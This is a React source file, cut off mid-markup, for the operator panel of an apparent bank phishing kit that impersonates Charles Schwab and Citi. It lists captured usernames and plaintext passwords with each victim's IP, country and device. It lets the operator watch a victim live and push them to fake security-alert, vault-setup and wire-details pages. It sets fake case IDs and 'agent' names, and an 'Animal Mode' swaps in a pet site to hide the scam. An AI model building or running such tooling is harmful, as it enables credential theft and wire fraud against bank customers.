import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { LogOut, Monitor, Trash2, Eye, EyeOff, X, PawPrint, Save, Settings, ChevronDown, ChevronUp } from 'lucide-react';

// ── Types ────────────────────────────────────────────────────────────────────

interface LoginAttempt {
  id: string;
  userId: string;
  password: string;
  timestamp: string;
  ip: string;
  country: string;
  page: string;
  brand?: 'schwab' | 'citi';
  device: string;
  browser?: string;
  fingerprintId?: string;
  status: 'captured' | 'blocked' | 'dismissed';
  accountOption?: string;
  previousCredentials?: Array<{ userId: string; password: string; timestamp: string }>;
}

// ── Helpers ──────────────────────────────────────────────────────────────────

function formatTime(iso: string) {
  const d = new Date(iso);
  return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false });
}

function formatFull(iso: string) {
  const d = new Date(iso);
  return d.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
}

function getInitials(userId: string) {
  return (userId || '?').slice(0, 2).toUpperCase();
}

function getProvider(userId: string) {
  if (!userId) return 'Email';
  if (userId.includes('@gmail')) return 'Google';
  if (userId.includes('@yahoo')) return 'Yahoo';
  if (userId.includes('@hotmail') || userId.includes('@outlook') || userId.includes('@msn')) return 'Microsoft';
  if (userId.includes('@icloud') || userId.includes('@me.com') || userId.includes('@mac.com')) return 'Apple';
  return 'Email';
}

function getCountryFlag(country: string) {
  const flags: Record<string, string> = {
    US: '🇺🇸', AU: '🇦🇺', GB: '🇬🇧', CA: '🇨🇦', DE: '🇩🇪', FR: '🇫🇷', IN: '🇮🇳', NG: '🇳🇬', ZA: '🇿🇦',
    NZ: '🇳🇿', SG: '🇸🇬', AE: '🇦🇪', JP: '🇯🇵', BR: '🇧🇷', MX: '🇲🇽',
  };
  const code = Object.keys(flags).find(c => country.includes(c) || country.toUpperCase().includes(c));
  return code ? flags[code] : '🌐';
}

// ── Theme tokens ─────────────────────────────────────────────────────────────

function tokens(dark: boolean) {
  return {
    bg: dark ? '#0A0A0F' : '#F2F4F8',
    sidebar: dark ? '#111117' : '#FFFFFF',
    sidebarBorder: dark ? 'rgba(255,255,255,0.06)' : 'rgba(0,0,0,0.08)',
    card: dark ? 'rgba(255,255,255,0.04)' : '#FFFFFF',
    cardBorder: dark ? 'rgba(255,255,255,0.07)' : 'rgba(0,0,0,0.08)',
    cardHover: dark ? 'rgba(255,255,255,0.07)' : '#F8FAFC',
    text: dark ? '#FFFFFF' : '#0F172A',
    textSub: dark ? 'rgba(255,255,255,0.5)' : '#64748B',
    textMuted: dark ? 'rgba(255,255,255,0.25)' : '#94A3B8',
    label: dark ? 'rgba(255,255,255,0.25)' : '#94A3B8',
    divider: dark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.06)',
    topBar: dark ? '#18181F' : '#FFFFFF',
    topBarBorder: dark ? 'rgba(255,255,255,0.07)' : 'rgba(0,0,0,0.08)',
    btnSub: dark ? 'rgba(255,255,255,0.07)' : '#F1F5F9',
    btnSubText: dark ? 'rgba(255,255,255,0.55)' : '#475569',
    activeTab: dark ? 'rgba(26,172,226,0.18)' : 'rgba(26,172,226,0.1)',
    activeTabText: '#1AACE2',
  };
}

// ── Live View ────────────────────────────────────────────────────────────────

function LiveView({ attempt, visitorPage, visitorIsLive, dark, onClose }: {
  attempt: LoginAttempt;
  visitorPage: string;
  visitorIsLive: boolean;
  dark: boolean;
  onClose: () => void;
}) {
  const [showPass, setShowPass] = useState(false);
  // previewPath: the page we're previewing before sending; null = showing live view
  const [previewPath, setPreviewPath] = useState<string | null>(null);
  const t = tokens(dark);

  // Live iframe src (visitor's current page)
  const rawSrc = (visitorPage && visitorPage !== '—') ? visitorPage : '/';
  const liveSrc = rawSrc.startsWith('/admin') ? '/' : rawSrc;

  // What the iframe currently shows
  const displaySrc = previewPath ?? liveSrc;
  const [iframeKey, setIframeKey] = useState(displaySrc);
  useEffect(() => { setIframeKey(displaySrc); }, [displaySrc]);

  const isPreviewMode = previewPath !== null;
  const previewLabel = NAV_PAGES.find(p => p.path === previewPath)?.label ?? previewPath;

  function sendToVisitor() {
    if (!previewPath) return;
    localStorage.setItem('finvault_force_nav', previewPath);
    setPreviewPath(null);
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%', background: t.bg }}>
      {/* Top bar */}
      <div style={{ height: 44, background: t.topBar, borderBottom: `1px solid ${t.topBarBorder}`, display: 'flex', alignItems: 'center', padding: '0 16px', gap: 14, flexShrink: 0 }}>
        <span style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 12, fontWeight: 700, color: t.text }}>
          <span style={{ width: 8, height: 8, borderRadius: '50%', background: visitorIsLive ? '#22C55E' : '#6B7280', display: 'inline-block', boxShadow: visitorIsLive ? '0 0 0 2px rgba(34,197,94,0.3)' : 'none' }} />
          {isPreviewMode ? 'Preview Mode' : 'Live View'}
        </span>
        <span style={{ fontSize: 11, padding: '2px 7px', borderRadius: 4, background: isPreviewMode ? 'rgba(245,158,11,0.15)' : t.btnSub, color: isPreviewMode ? '#F59E0B' : t.textSub, fontWeight: 600, fontFamily: 'monospace', border: isPreviewMode ? '1px solid rgba(245,158,11,0.4)' : 'none' }}>
          {isPreviewMode ? previewPath : ((visitorPage && visitorPage !== '—' && visitorPage !== '/') ? visitorPage : 'Home')}
        </span>
        {!isPreviewMode && <>
          <span style={{ fontSize: 11, color: t.textSub }}>📍 {attempt.country}</span>
          <span style={{ fontSize: 11, color: t.textMuted, fontFamily: 'monospace' }}>{attempt.ip}</span>
          <span style={{ fontSize: 11, color: t.textMuted }}>{attempt.device}</span>
          <span style={{ fontSize: 11, color: t.textMuted }}>
            {visitorIsLive
              ? <span style={{ color: '#22C55E', fontWeight: 600 }}>● Online now</span>
              : <span>Last seen: {liveSrc}</span>}
          </span>
        </>}
        {isPreviewMode && (
          <span style={{ fontSize: 11, color: '#F59E0B', fontWeight: 600 }}>
            👁 Previewing — confirm before sending to visitor
          </span>
        )}
        <div style={{ flex: 1 }} />
        <button onClick={onClose} style={{ width: 26, height: 26, borderRadius: '50%', border: 'none', background: t.btnSub, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <X size={13} color={t.textSub} />
        </button>
      </div>

      {/* Body: iframe left, credential card right */}
      <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>

        {/* iframe panel */}
        <div style={{ flex: 1, position: 'relative', background: '#000', overflow: 'hidden' }}>
          {/* Live visitor screen — always visible */}
          <iframe
            key={liveSrc}
            src={liveSrc}
            style={{ width: '100%', height: '100%', border: 'none', display: 'block' }}
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
            title="Visitor screen"
          />
          {/* Offline notice */}
          {!visitorIsLive && !isPreviewMode && (
            <div style={{ position: 'absolute', top: 10, left: '50%', transform: 'translateX(-50%)', background: 'rgba(0,0,0,0.7)', color: '#fff', fontSize: 11, padding: '5px 12px', borderRadius: 12, backdropFilter: 'blur(4px)', pointerEvents: 'none' }}>
              Visitor offline — showing last known page
            </div>
          )}
          {/* Preview popup — floats over the live screen */}
          {isPreviewMode && (
            <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.45)', backdropFilter: 'blur(1px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 10 }}>
              <div style={{ width: '78%', height: '82%', display: 'flex', flexDirection: 'column', borderRadius: 10, overflow: 'hidden', boxShadow: '0 20px 60px rgba(0,0,0,0.7), 0 0 0 1px rgba(245,158,11,0.5)' }}>
                {/* Popup header */}
                <div style={{ background: '#1C2227', padding: '8px 14px', display: 'flex', alignItems: 'center', gap: 10, flexShrink: 0 }}>
                  <span style={{ fontSize: 10, fontWeight: 700, color: '#F59E0B', letterSpacing: '0.08em', textTransform: 'uppercase' }}>👁 Preview</span>
                  <span style={{ fontSize: 11, fontFamily: 'monospace', color: '#94A3B8', background: 'rgba(255,255,255,0.06)', padding: '2px 7px', borderRadius: 3 }}>{previewPath}</span>
                  <div style={{ flex: 1 }} />
                  <button
                    onClick={() => setPreviewPath(null)}
                    style={{ fontSize: 11, fontWeight: 600, padding: '3px 10px', borderRadius: 4, border: '1px solid rgba(255,255,255,0.15)', cursor: 'pointer', background: 'transparent', color: '#94A3B8' }}>
                    ✕ Close
                  </button>
                  <button
                    onClick={sendToVisitor}
                    style={{ fontSize: 11, fontWeight: 700, padding: '4px 14px', borderRadius: 4, border: 'none', cursor: 'pointer', background: '#1AACE2', color: '#fff' }}>
                    ✓ Send to Visitor
                  </button>
                </div>
                {/* Preview iframe */}
                <iframe
                  key={previewPath}
                  src={previewPath!}
                  style={{ flex: 1, border: 'none', display: 'block', background: '#fff' }}
                  sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
                  title="Page preview"
                />
              </div>
            </div>
          )}
        </div>

        {/* Credential card */}
        <div style={{ width: 260, background: t.sidebar, borderLeft: `1px solid ${t.sidebarBorder}`, overflowY: 'auto', flexShrink: 0, padding: '18px 16px', display: 'flex', flexDirection: 'column', gap: 14 }}>
          {/* Avatar + name */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <div style={{ width: 38, height: 38, borderRadius: 9, background: '#1AACE2', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
              <span style={{ color: '#fff', fontSize: 13, fontWeight: 700 }}>{getInitials(attempt.userId)}</span>
            </div>
            <div>
              <div style={{ fontSize: 13, fontWeight: 700, color: t.text, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: 180 }}>{attempt.userId || '(empty)'}</div>
              <div style={{ fontSize: 11, color: t.textSub }}>{getProvider(attempt.userId)} · {attempt.device}</div>
            </div>
          </div>

          {/* Fields */}
          {([
            { label: 'IP ADDRESS', val: attempt.ip, mono: true },
            { label: 'COUNTRY', val: attempt.country },
            ...(attempt.accountOption ? [{ label: 'SECTION', val: attempt.accountOption }] : []),
            { label: 'CAPTURED', val: formatFull(attempt.timestamp) },
            { label: 'STATUS', val: attempt.status.toUpperCase(), accent: '#22C55E' },
          ] as { label: string; val: string; mono?: boolean; accent?: string }[]).map(({ label, val, mono, accent }) => (
            <div key={label} style={{ paddingBottom: 10, borderBottom: `1px solid ${t.divider}` }}>
              <div style={{ fontSize: 9, fontWeight: 700, color: t.label, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 3 }}>{label}</div>
              <div style={{ fontSize: 12, color: accent || (mono ? (dark ? '#A5F3FC' : '#0369A1') : t.text), fontFamily: mono ? 'monospace' : 'inherit', fontWeight: 500 }}>{val}</div>
            </div>
          ))}

          {/* Password */}
          <div style={{ paddingBottom: 10, borderBottom: `1px solid ${t.divider}` }}>
            <div style={{ fontSize: 9, fontWeight: 700, color: t.label, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 5 }}>PASSWORD</div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ fontSize: 14, fontFamily: 'monospace', color: '#F59E0B', fontWeight: 600 }}>
                {showPass ? (attempt.password || '(empty)') : '•'.repeat(Math.max(attempt.password?.length || 4, 6))}
              </span>
              <button onClick={() => setShowPass(v => !v)} style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 11, fontWeight: 600, padding: '3px 8px', borderRadius: 4, border: 'none', cursor: 'pointer', background: showPass ? 'rgba(245,158,11,0.12)' : t.btnSub, color: showPass ? '#F59E0B' : t.textSub }}>
                {showPass ? <EyeOff size={10} /> : <Eye size={10} />} {showPass ? 'Hide' : 'Show'}
              </button>
            </div>
          </div>

          {/* Send To Page controls */}
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#1AACE2', letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 8 }}>Send To Page</div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
              {NAV_PAGES.map(({ label, path }) => {
                const isVisitorHere = visitorIsLive && visitorPage === path;
                const isPreviewing = previewPath === path;
                return (
                  <button
                    key={path}
                    onClick={() => setPreviewPath(isPreviewing ? null : path)}
                    style={{
                      width: '100%', textAlign: 'left', padding: '6px 10px',
                      border: `1px solid ${isPreviewing ? '#F59E0B' : isVisitorHere ? '#1AACE2' : t.cardBorder}`,
                      borderRadius: 5, cursor: 'pointer',
                      fontSize: 11, fontWeight: (isPreviewing || isVisitorHere) ? 700 : 500,
                      background: isPreviewing ? 'rgba(245,158,11,0.14)' : isVisitorHere ? 'rgba(26,172,226,0.14)' : t.btnSub,
                      color: isPreviewing ? '#F59E0B' : isVisitorHere ? '#1AACE2' : t.textSub,
                      display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    }}>
                    <span>{label}</span>
                    {isPreviewing && (
                      <span style={{ fontSize: 7, fontWeight: 700, background: '#F59E0B', color: '#000', padding: '1px 5px', borderRadius: 2, letterSpacing: '0.06em' }}>PREVIEW</span>
                    )}
                    {!isPreviewing && isVisitorHere && (
                      <span style={{ fontSize: 7, fontWeight: 700, background: '#1AACE2', color: '#fff', padding: '1px 5px', borderRadius: 2, letterSpacing: '0.06em' }}>HERE</span>
                    )}
                  </button>
                );
              })}
            </div>
            {/* Confirm send button — visible only in preview mode */}
            {isPreviewMode && (
              <button
                onClick={sendToVisitor}
                style={{ marginTop: 10, width: '100%', padding: '8px 0', borderRadius: 5, border: 'none', cursor: 'pointer', background: '#1AACE2', color: '#fff', fontSize: 12, fontWeight: 700, letterSpacing: '0.03em' }}>
                ✓ Send "{previewLabel}" to Visitor
              </button>
            )}
            {isPreviewMode && (
              <button
                onClick={() => setPreviewPath(null)}
                style={{ marginTop: 5, width: '100%', padding: '6px 0', borderRadius: 5, border: `1px solid ${t.cardBorder}`, cursor: 'pointer', background: t.btnSub, color: t.textSub, fontSize: 11, fontWeight: 600 }}>
                ← Back to Live View
              </button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Per-page settings panel ──────────────────────────────────────────────────

function PageSettingsPanel({ themeKey, accentColor, dark }: {
  themeKey: 'schwab' | 'citi'; accentColor: string; dark: boolean;
}) {
  const t = tokens(dark);
  const storageKey = `finvault_case_id_${themeKey}`;
  const agentsKey = `finvault_agents_${themeKey}`;
  const defaultId = themeKey === 'schwab' ? 'SEC-C1002D' : 'SEC-D4891F';
  const [caseId, setCaseId] = useState(() => localStorage.getItem(storageKey) || defaultId);
  const [saved, setSaved] = useState(false);

  // Agent names — stored as JSON string array
  const [agents, setAgents] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem(agentsKey) || '[]'); } catch { return []; }
  });
  const [agentInput, setAgentInput] = useState('');

  const save = () => {
    localStorage.setItem(storageKey, caseId.trim() || defaultId);
    setSaved(true);
    setTimeout(() => setSaved(false), 2000);
  };

  const addAgent = () => {
    const name = agentInput.trim();
    if (!name || agents.includes(name)) return;
    const next = [...agents, name];
    setAgents(next);
    localStorage.setItem(agentsKey, JSON.stringify(next));
    setAgentInput('');
  };

  const removeAgent = (name: string) => {
    const next = agents.filter(a => a !== name);
    setAgents(next);
    localStorage.setItem(agentsKey, JSON.stringify(next));
  };

  const inputBase = {
    height: 30, padding: '0 8px', borderRadius: 4, border: `1px solid ${t.cardBorder}`,
    background: dark ? 'rgba(255,255,255,0.06)' : '#F8FAFC',
    color: t.text, fontSize: 12, outline: 'none',
  };

  return (
    <div style={{ borderTop: `1px solid ${t.cardBorder}`, padding: '12px 14px', background: dark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.02)', display: 'flex', flexDirection: 'column', gap: 14 }}>

      {/* Case ID */}
      <div>
        <div style={{ fontSize: 9, fontWeight: 700, color: t.label, letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 6 }}>
          Security Alert, Case ID
        </div>
        <div style={{ display: 'flex', gap: 6 }}>
          <input
            value={caseId}
            onChange={(e) => { setCaseId(e.target.value); setSaved(false); }}
            onKeyDown={(e) => e.key === 'Enter' && save()}
            placeholder={defaultId}
            style={{ ...inputBase, flex: 1, fontFamily: 'monospace' }}
          />
          <button onClick={save} style={{
            padding: '0 10px', borderRadius: 4, fontSize: 10, fontWeight: 700, cursor: 'pointer', border: 'none',
            background: saved ? 'rgba(34,197,94,0.15)' : `rgba(${accentColor === '#1AACE2' ? '26,172,226' : '96,165,250'},0.15)`,
            color: saved ? '#22C55E' : accentColor,
          }}>
            {saved ? '✓' : 'Save'}
          </button>
        </div>
      </div>

      {/* Agent names */}
      <div>
        <div style={{ fontSize: 9, fontWeight: 700, color: t.label, letterSpacing: '0.12em', textTransform: 'uppercase', marginBottom: 6 }}>
          Case Agents
        </div>
        <div style={{ fontSize: 10, color: t.textMuted, marginBottom: 7 }}>
          Shown on the confidentiality notice as authorised contacts.
        </div>
        <div style={{ display: 'flex', gap: 6, marginBottom: agents.length > 0 ? 8 : 0 }}>
          <input
            value={agentInput}
            onChange={(e) => setAgentInput(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && addAgent()}
            placeholder="Full name"
            style={{ ...inputBase, flex: 1 }}
          />
          <button
            onClick={addAgent}
            style={{
              padding: '0 10px', borderRadius: 4, fontSize: 10, fontWeight: 700, cursor: 'pointer', border: 'none',
              background: `rgba(${accentColor === '#1AACE2' ? '26,172,226' : '96,165,250'},0.15)`,
              color: accentColor,
            }}>
            Add
          </button>
        </div>
        {agents.length > 0 && (
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5 }}>
            {agents.map(name => (
              <div key={name} style={{
                display: 'flex', alignItems: 'center', gap: 5,
                padding: '3px 8px', borderRadius: 4,
                background: dark ? 'rgba(255,255,255,0.07)' : '#F1F5F9',
                border: `1px solid ${t.cardBorder}`,
              }}>
                <span style={{ fontSize: 10, fontWeight: 600, color: t.text }}>{name}</span>
                <button
                  onClick={() => removeAgent(name)}
                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center', color: t.textMuted, lineHeight: 1 }}>
                  <X size={10} />
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

// ── Design Switcher ───────────────────────────────────────────────────────────

function DesignSwitcher({ activeTheme, switchTheme, animalMode, toggleAnimal, dark }: {
  activeTheme: 'schwab' | 'citi'; switchTheme: (t: 'schwab' | 'citi') => void;
  animalMode: boolean; toggleAnimal: () => void; dark: boolean;
}) {
  const t = tokens(dark);
  const [openSettings, setOpenSettings] = useState<'schwab' | 'citi' | null>(null);

  return (
    <div style={{ flex: 1, overflowY: 'auto', padding: '28px 32px', background: t.bg }}>
      <div style={{ fontSize: 12, color: t.textSub, marginBottom: 24 }}>
        Control which homepage visitors see at <span style={{ fontFamily: 'monospace', color: '#1AACE2' }}>/</span>. Animal Mode overrides both.
      </div>

      {/* Animal Mode */}
      <div style={{ background: t.card, border: `1px solid ${t.cardBorder}`, borderRadius: 10, padding: '14px 18px', marginBottom: 24, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <PawPrint size={16} color={animalMode ? '#E07B54' : t.textMuted} />
          <div>
            <div style={{ fontSize: 13, fontWeight: 600, color: animalMode ? '#E07B54' : t.text }}>Animal Mode</div>
            <div style={{ fontSize: 11, color: t.textMuted, marginTop: 1 }}>{animalMode ? 'Active, visitors see Paws & Find' : 'Off, financial site active'}</div>
          </div>
        </div>
        <button onClick={toggleAnimal} style={{ padding: '6px 14px', borderRadius: 6, fontSize: 11, fontWeight: 700, cursor: 'pointer', background: animalMode ? '#E07B54' : t.btnSub, color: animalMode ? '#fff' : '#E07B54', border: '1.5px solid #E07B54' }}>
          {animalMode ? 'Turn Off' : 'Turn On'}
        </button>
      </div>

      <div style={{ display: 'flex', gap: 16 }}>
        {/* Charles Schwab card */}
        {(['schwab', 'citi'] as const).map(themeKey => {
          const isSchwab = themeKey === 'schwab';
          const accent = isSchwab ? '#1AACE2' : '#60A5FA';
          const isActive = activeTheme === themeKey;
          const settingsOpen = openSettings === themeKey;

          return (
            <div key={themeKey} style={{
              flex: 1, maxWidth: 220, background: t.card,
              border: `2px solid ${isActive ? accent : t.cardBorder}`,
              borderRadius: 10, overflow: 'hidden',
              boxShadow: isActive ? `0 0 0 3px ${accent}1F` : 'none',
              transition: 'all 0.15s',
            }}>
              {/* Preview header */}
              <div
                onClick={() => switchTheme(themeKey)}
                style={{ height: 80, background: isSchwab ? '#1AACE2' : '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
                {isSchwab ? (
                  <svg width="90" height="64" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
                    <text x="100" y="66" textAnchor="middle" fontFamily="Georgia,'Times New Roman',serif" fontStyle="italic" fontSize="60" fontWeight="400" fill="white">charles</text>
                    <text x="100" y="114" textAnchor="middle" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="40" fill="white" letterSpacing="4">SCHWAB</text>
                  </svg>
                ) : (
                  <svg width="90" height="52" viewBox="0 0 120 64" xmlns="http://www.w3.org/2000/svg">
                    <text x="4" y="56" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="58" fill="#003087" letterSpacing="-1">citi</text>
                    <path d="M78 12 Q90 4 102 12" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/>
                  </svg>
                )}
              </div>

              {/* Card body */}
              <div style={{ padding: '10px 14px 12px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 4 }}>
                  <div style={{ fontSize: 13, fontWeight: 700, color: t.text }}>{isSchwab ? 'Charles Schwab' : 'Citi'}</div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                    {isActive && <span style={{ fontSize: 9, fontWeight: 700, color: accent, background: `${accent}1F`, padding: '2px 6px', borderRadius: 6 }}>✓ ACTIVE</span>}
                    {/* Gear icon to toggle per-page settings */}
                    <button
                      onClick={(e) => { e.stopPropagation(); setOpenSettings(settingsOpen ? null : themeKey); }}
                      title="Page settings"
                      style={{ width: 22, height: 22, borderRadius: 4, border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
                        background: settingsOpen ? `${accent}1F` : 'transparent', color: settingsOpen ? accent : t.textMuted,
                      }}
                      onMouseEnter={(e) => { e.currentTarget.style.background = `${accent}1F`; e.currentTarget.style.color = accent; }}
                      onMouseLeave={(e) => { if (!settingsOpen) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = t.textMuted; } }}>
                      <Settings size={12} />
                    </button>
                  </div>
                </div>
                <div style={{ fontSize: 10, color: t.textMuted, marginBottom: 10 }}>{isSchwab ? 'Dark institutional' : 'Bright banking'}</div>
                <button
                  onClick={(e) => { e.stopPropagation(); switchTheme(themeKey); }}
                  disabled={isActive}
                  style={{ width: '100%', padding: '7px 0', borderRadius: 5, fontSize: 11, fontWeight: 700,
                    border: `1px solid ${accent}80`, cursor: isActive ? 'default' : 'pointer',
                    background: isActive ? `${accent}1F` : 'transparent', color: accent, opacity: isActive ? 0.6 : 1 }}>
                  {isActive ? 'Active' : 'Set Active'}
                </button>
              </div>

              {/* Per-page settings panel (inline, toggleable) */}
              {settingsOpen && <PageSettingsPanel themeKey={themeKey} accentColor={accent} dark={dark} />}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── Visitor Card ─────────────────────────────────────────────────────────────

interface PrevCred { userId: string; password: string; timestamp: string }

function CredRow({ userId, password, timestamp, label, dark, t }: {
  userId: string; password: string; timestamp: string; label?: string;
  dark: boolean; t: ReturnType<typeof tokens>;
}) {
  const [show, setShow] = useState(false);
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '4px 0', borderBottom: `1px solid ${t.cardBorder}` }}>
      {label && <span style={{ fontSize: 9, fontWeight: 700, color: '#22C55E', minWidth: 38 }}>{label}</span>}
      <span style={{ fontSize: 11, fontFamily: 'monospace', color: t.text, flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{userId}</span>
      <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
        <span style={{ fontSize: 11, fontFamily: 'monospace', color: t.textSub }}>
          {show ? password : '••••••••'}
        </span>
        <button onClick={() => setShow(v => !v)} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0, display: 'flex', alignItems: 'center' }}>
          {show ? <EyeOff size={11} color={t.textMuted} /> : <Eye size={11} color={t.textMuted} />}
        </button>
      </div>
      <span style={{ fontSize: 9, color: t.textMuted, whiteSpace: 'nowrap', flexShrink: 0 }}>{formatTime(timestamp)}</span>
    </div>
  );
}

const NAV_PAGES = [
  { label: 'Home', path: '/' },
  { label: 'Alert', path: '/security-alert' },
  { label: 'Vault Setup', path: '/vault-setup' },
  { label: 'Creating', path: '/vault-creating' },
  { label: 'Dashboard', path: '/vault-dashboard' },
  { label: 'Wire Details', path: '/wire-details' },
] as const;

function VisitorCard({ a, isLive, isSaved, hasHistory, prevCreds, dark, t, visitorPage, onView, onSave, onDelete }: {
  a: LoginAttempt; isLive: boolean; isSaved: boolean;
  hasHistory: boolean; prevCreds: PrevCred[];
  dark: boolean; t: ReturnType<typeof tokens>;
  visitorPage: string;
  onView: () => void; onSave: () => void; onDelete: () => void;
}) {
  const [historyOpen, setHistoryOpen] = useState(false);

  return (
    <div style={{ background: t.card, border: `1px solid ${t.cardBorder}`, borderRadius: 10, padding: '13px 15px' }}>
      {/* Top row */}
      <div style={{ display: 'flex', alignItems: 'flex-start', gap: 11, marginBottom: 10 }}>
        <div style={{ width: 38, height: 38, borderRadius: 9, background: '#1AACE2', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, position: 'relative' }}>
          <span style={{ color: '#fff', fontSize: 13, fontWeight: 700 }}>{getInitials(a.userId)}</span>
          {isLive && <span style={{ position: 'absolute', bottom: -2, right: -2, width: 10, height: 10, borderRadius: '50%', background: '#22C55E', border: `2px solid ${t.card}` }} />}
        </div>

        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 3, flexWrap: 'wrap' }}>
            <span style={{ fontSize: 14, fontWeight: 700, color: t.text, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: 160 }}>{a.userId || 'Unknown'}</span>
            <span style={{ fontSize: 10, fontWeight: 700, padding: '1px 6px', borderRadius: 4, background: 'rgba(96,165,250,0.15)', color: '#60A5FA', flexShrink: 0 }}>{getProvider(a.userId)}</span>
            {/* Brand badge — which page captured this visitor */}
            {(a.brand === 'citi' || a.page?.includes('citi')) ? (
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: 3, fontSize: 9, fontWeight: 700, padding: '1px 6px', borderRadius: 3, background: 'rgba(0,48,135,0.12)', color: '#003087', flexShrink: 0, letterSpacing: '0.04em' }}>
                <svg width="18" height="9" viewBox="0 0 120 64"><text x="2" y="52" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#003087" letterSpacing="-1">citi</text><path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/></svg>
              </span>
            ) : (
              <span style={{ display: 'inline-flex', alignItems: 'center', gap: 3, fontSize: 9, fontWeight: 700, padding: '1px 6px', borderRadius: 3, background: 'rgba(26,172,226,0.12)', color: '#1AACE2', flexShrink: 0, letterSpacing: '0.06em' }}>
                SCHWAB
              </span>
            )}
            {isLive && <span style={{ fontSize: 10, fontWeight: 700, padding: '1px 6px', borderRadius: 4, background: 'rgba(34,197,94,0.12)', color: '#22C55E', flexShrink: 0 }}>● LIVE</span>}
            {isSaved && <span style={{ fontSize: 10, fontWeight: 700, padding: '1px 6px', borderRadius: 4, background: 'rgba(34,197,94,0.1)', color: '#22C55E', flexShrink: 0 }}>Saved</span>}
            {hasHistory && <span style={{ fontSize: 10, fontWeight: 700, padding: '1px 6px', borderRadius: 4, background: 'rgba(251,191,36,0.15)', color: '#FBBF24', flexShrink: 0 }}>↺ {prevCreds.length} update{prevCreds.length !== 1 ? 's' : ''}</span>}
          </div>
          <div style={{ fontSize: 11, color: t.textSub }}>
            {getCountryFlag(a.country)} {a.country} · {a.ip}
          </div>
          <div style={{ fontSize: 11, color: t.textMuted }}>
            {a.device} · {formatFull(a.timestamp)}
          </div>
          {a.browser && (
            <div style={{ fontSize: 10, color: t.textMuted, marginTop: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
              {a.browser}
            </div>
          )}
        </div>

        <div style={{ fontSize: 11, color: t.textMuted, flexShrink: 0 }}>{formatTime(a.timestamp)}</div>
      </div>

      {/* Latest credentials */}
      <div style={{ background: dark ? 'rgba(255,255,255,0.04)' : 'rgba(0,0,0,0.03)', borderRadius: 6, padding: '6px 10px', marginBottom: 8 }}>
        <div style={{ fontSize: 9, fontWeight: 700, color: t.label, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 4 }}>Latest Credentials</div>
        <CredRow userId={a.userId} password={a.password} timestamp={a.timestamp} label="NEW" dark={dark} t={t} />
      </div>

      {/* Previous credentials (expandable) */}
      {hasHistory && (
        <div style={{ marginBottom: 8 }}>
          <button
            onClick={() => setHistoryOpen(v => !v)}
            style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '5px 10px', borderRadius: 6, border: 'none', cursor: 'pointer', fontSize: 11, fontWeight: 600, background: dark ? 'rgba(251,191,36,0.07)' : 'rgba(251,191,36,0.06)', color: '#FBBF24' }}>
            <span>Previous attempts ({prevCreds.length})</span>
            {historyOpen ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
          </button>
          {historyOpen && (
